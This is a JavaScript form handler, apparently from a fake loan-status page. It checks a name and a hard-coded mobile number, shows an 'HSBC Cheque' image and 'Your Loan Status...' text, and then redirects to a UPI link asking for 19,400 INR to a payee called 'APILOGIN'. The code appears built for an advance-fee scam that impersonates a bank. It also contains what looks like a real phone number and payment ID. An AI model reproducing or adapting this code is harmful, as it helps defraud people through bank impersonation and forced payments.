function validateForm(event) {
  event.preventDefault(); // Prevent form submission

  const name = document.getElementById("name").value.trim();
  const mobileNumber = document.getElementById("mobile-number").value.trim();
  const errorMessage = document.getElementById("error-message");
  const successImage = document.getElementById("success-image");

  // Specific valid mobile number
  const validMobileNumber = "9845940999";

  if (name === "") {
    errorMessage.textContent = "Please enter your name.";
    return;
  }

  if (mobileNumber !== validMobileNumber) {
    errorMessage.textContent = "Please enter the correct mobile number.";
    return;
  }

  // Clear any previous error message
  errorMessage.textContent = "";

  // Show the success image
  successImage.src = "./HSBC Cheque.png"; // Path to your specific image
  successImage.style.display = "block";

  // Change button style and text
  const button = event.target;
  button.classList.add("Loading"); // Add processing class
  button.innerHTML = "Your Loan Status...";

  // Redirect after a delay
  setTimeout(() => {
    window.location.href = "upi://pay?pa=93192497m@ybl&pn=APILOGIN&cu=INR&am=19400";
  }, 3000); // Change to the desired duration in milliseconds
}
